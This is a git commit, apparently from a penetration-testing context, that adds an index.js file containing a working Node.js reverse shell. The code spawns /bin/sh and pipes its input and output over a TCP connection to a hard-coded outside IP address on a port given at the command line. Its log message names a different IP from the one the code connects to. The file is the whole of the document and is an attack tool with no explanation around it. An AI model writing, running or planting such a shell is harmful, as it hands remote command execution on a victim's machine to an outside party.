049b36a7ec869c674256a605600d071b9259823d
Thomas Hardt <thomas.hardt@praetorian.com>
2021-02-04 15:55:21 -0600

    Added rshell stuff

---
+++ index.js
@@ -0,0 +1,17 @@
+(function(){
+    var rport = process.argv[2];
+    console.log("Attempting to open reverse shell to 35.188.157.133 on port", rport, "...");
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(rport, "34.122.233.42", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    process.exitCode=0;
+    return /a/; // Prevents the Node.js application form crashing
+})();
+process.ExitCode=0;
+//d
